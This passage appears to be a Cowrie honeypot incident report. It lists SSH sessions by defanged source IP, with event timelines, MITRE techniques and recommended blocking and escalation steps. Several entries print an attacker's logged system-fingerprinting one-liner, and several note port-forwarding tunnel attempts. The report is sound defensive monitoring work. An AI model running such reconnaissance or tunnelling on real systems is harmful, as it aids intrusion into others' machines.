- [ ] Block `196.188.93[.]169` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8835f2f667

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:40 |
| **Last Seen** | 2026-08-01 12:40 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:40:30` | `cowrie.session.connect` |
| `2026-08-01 12:40:30` | `cowrie.client.version` |
| `2026-08-01 12:40:30` | `cowrie.client.kex` |
| `2026-08-01 12:40:31` | `cowrie.login.success` |
| `2026-08-01 12:40:31` | `cowrie.session.params` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:31` | `cowrie.command.success` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:31` | `cowrie.command.input` |
| `2026-08-01 12:40:32` | `cowrie.log.closed` |
| `2026-08-01 12:40:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b09958ee9dfb

| Field | Detail |
|---|---|
| **Source IP** | `31.173.66[.]222` |
| **First Seen** | 2026-08-01 12:41 |
| **Last Seen** | 2026-08-01 12:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:41:17` | `cowrie.session.connect` |
| `2026-08-01 12:41:18` | `cowrie.client.version` |
| `2026-08-01 12:41:18` | `cowrie.client.kex` |
| `2026-08-01 12:41:18` | `cowrie.login.success` |
| `2026-08-01 12:41:19` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:41:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.66[.]222` to AbuseIPDB if not already reported
- [ ] Block `31.173.66[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd5849a58bfd

| Field | Detail |
|---|---|
| **Source IP** | `83.166.50[.]15` |
| **First Seen** | 2026-08-01 12:41 |
| **Last Seen** | 2026-08-01 12:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:41:24` | `cowrie.session.connect` |
| `2026-08-01 12:41:24` | `cowrie.client.version` |
| `2026-08-01 12:41:24` | `cowrie.client.kex` |
| `2026-08-01 12:41:25` | `cowrie.login.success` |
| `2026-08-01 12:41:26` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:41:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.166.50[.]15` to AbuseIPDB if not already reported
- [ ] Block `83.166.50[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e42681b29fc6

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:42 |
| **Last Seen** | 2026-08-01 12:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:42:16` | `cowrie.session.connect` |
| `2026-08-01 12:42:16` | `cowrie.client.version` |
| `2026-08-01 12:42:16` | `cowrie.client.kex` |
| `2026-08-01 12:42:17` | `cowrie.login.success` |
| `2026-08-01 12:42:18` | `cowrie.session.params` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:18` | `cowrie.command.success` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:18` | `cowrie.command.input` |
| `2026-08-01 12:42:19` | `cowrie.log.closed` |
| `2026-08-01 12:42:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6b2fda8b42

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:43 |
| **Last Seen** | 2026-08-01 12:44 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:43:58` | `cowrie.session.connect` |
| `2026-08-01 12:43:58` | `cowrie.client.version` |
| `2026-08-01 12:43:58` | `cowrie.client.kex` |
| `2026-08-01 12:43:59` | `cowrie.login.success` |
| `2026-08-01 12:44:00` | `cowrie.session.params` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.command.success` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.command.input` |
| `2026-08-01 12:44:00` | `cowrie.log.closed` |
| `2026-08-01 12:44:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bff015c5a56f

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-01 12:44 |
| **Last Seen** | 2026-08-01 12:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:44:35` | `cowrie.session.connect` |
| `2026-08-01 12:44:35` | `cowrie.client.version` |
| `2026-08-01 12:44:35` | `cowrie.client.kex` |
| `2026-08-01 12:44:35` | `cowrie.login.success` |
| `2026-08-01 12:44:35` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:44:35` | `cowrie.direct-tcpip.data` |
| `2026-08-01 12:44:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44a7c67e4a9b

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:45 |
| **Last Seen** | 2026-08-01 12:45 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:45:43` | `cowrie.session.connect` |
| `2026-08-01 12:45:43` | `cowrie.client.version` |
| `2026-08-01 12:45:43` | `cowrie.client.kex` |
| `2026-08-01 12:45:45` | `cowrie.login.success` |
| `2026-08-01 12:45:45` | `cowrie.session.params` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:45` | `cowrie.command.success` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:45` | `cowrie.command.input` |
| `2026-08-01 12:45:46` | `cowrie.log.closed` |
| `2026-08-01 12:45:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5ef12753137

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:47 |
| **Last Seen** | 2026-08-01 12:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:47:28` | `cowrie.session.connect` |
| `2026-08-01 12:47:28` | `cowrie.client.version` |
| `2026-08-01 12:47:28` | `cowrie.client.kex` |
| `2026-08-01 12:47:29` | `cowrie.login.success` |
| `2026-08-01 12:47:31` | `cowrie.session.params` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.command.success` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.command.input` |
| `2026-08-01 12:47:31` | `cowrie.log.closed` |
| `2026-08-01 12:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1db65134b63d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:49 |
| **Last Seen** | 2026-08-01 12:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:49:12` | `cowrie.session.connect` |
| `2026-08-01 12:49:12` | `cowrie.client.version` |
| `2026-08-01 12:49:12` | `cowrie.client.kex` |
| `2026-08-01 12:49:13` | `cowrie.login.success` |
| `2026-08-01 12:49:14` | `cowrie.session.params` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.command.success` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.command.input` |
| `2026-08-01 12:49:14` | `cowrie.log.closed` |
| `2026-08-01 12:49:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62309728b7ba

| Field | Detail |
|---|---|
| **Source IP** | `187.126.105[.]42` |
| **First Seen** | 2026-08-01 12:49 |
| **Last Seen** | 2026-08-01 12:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:49:34` | `cowrie.session.connect` |
| `2026-08-01 12:49:34` | `cowrie.client.version` |
| `2026-08-01 12:49:34` | `cowrie.client.kex` |
| `2026-08-01 12:49:36` | `cowrie.login.success` |
| `2026-08-01 12:49:37` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:49:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.126.105[.]42` to AbuseIPDB if not already reported
- [ ] Block `187.126.105[.]42` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51aaee81d377

| Field | Detail |
|---|---|
| **Source IP** | `31.173.8[.]170` |
| **First Seen** | 2026-08-01 12:49 |
| **Last Seen** | 2026-08-01 12:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:49:46` | `cowrie.session.connect` |
| `2026-08-01 12:49:47` | `cowrie.client.version` |
| `2026-08-01 12:49:47` | `cowrie.client.kex` |
| `2026-08-01 12:49:48` | `cowrie.login.success` |
| `2026-08-01 12:49:48` | `cowrie.direct-tcpip.request` |
| `2026-08-01 12:49:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.8[.]170` to AbuseIPDB if not already reported
- [ ] Block `31.173.8[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f2bbe64fdb9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:50 |
| **Last Seen** | 2026-08-01 12:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:50:58` | `cowrie.session.connect` |
| `2026-08-01 12:50:58` | `cowrie.client.version` |
| `2026-08-01 12:50:58` | `cowrie.client.kex` |
| `2026-08-01 12:50:59` | `cowrie.login.success` |
| `2026-08-01 12:51:00` | `cowrie.session.params` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.command.success` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.command.input` |
| `2026-08-01 12:51:00` | `cowrie.log.closed` |
| `2026-08-01 12:51:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7bc381915e3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:52 |
| **Last Seen** | 2026-08-01 12:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:52:42` | `cowrie.session.connect` |
| `2026-08-01 12:52:42` | `cowrie.client.version` |
| `2026-08-01 12:52:42` | `cowrie.client.kex` |
| `2026-08-01 12:52:43` | `cowrie.login.success` |
| `2026-08-01 12:52:44` | `cowrie.session.params` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.command.success` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.command.input` |
| `2026-08-01 12:52:44` | `cowrie.log.closed` |
| `2026-08-01 12:52:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff748c1254f

| Field | Detail |
|---|---|
| **Source IP** | `20.227.140[.]178` |
| **First Seen** | 2026-08-01 12:53 |
| **Last Seen** | 2026-08-01 12:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:53:23` | `cowrie.session.connect` |
| `2026-08-01 12:53:23` | `cowrie.client.version` |
| `2026-08-01 12:53:23` | `cowrie.client.kex` |
| `2026-08-01 12:53:23` | `cowrie.login.success` |
| `2026-08-01 12:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.227.140[.]178` to AbuseIPDB if not already reported
- [ ] Block `20.227.140[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499855a9fed0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]227` |
| **First Seen** | 2026-08-01 12:54 |
| **Last Seen** | 2026-08-01 12:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-01 12:54:30` | `cowrie.session.connect` |
| `2026-08-01 12:54:30` | `cowrie.client.version` |
| `2026-08-01 12:54:30` | `cowrie.client.kex` |
| `2026-08-01 12:54:31` | `cowrie.login.success` |
| `2026-08-01 12:54:32` | `cowrie.session.params` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.command.success` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.command.input` |
| `2026-08-01 12:54:32` | `cowrie.log.closed` |
| `2026-08-01 12:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]227` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.199.80[.]137` | **9** | 2026-08-01 09:02 | 2026-08-01 12:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.233.83[.]203` | **6** | 2026-08-01 09:16 | 2026-08-01 11:51 | 5m | 0 | `T1592` | 🟢 LOW |
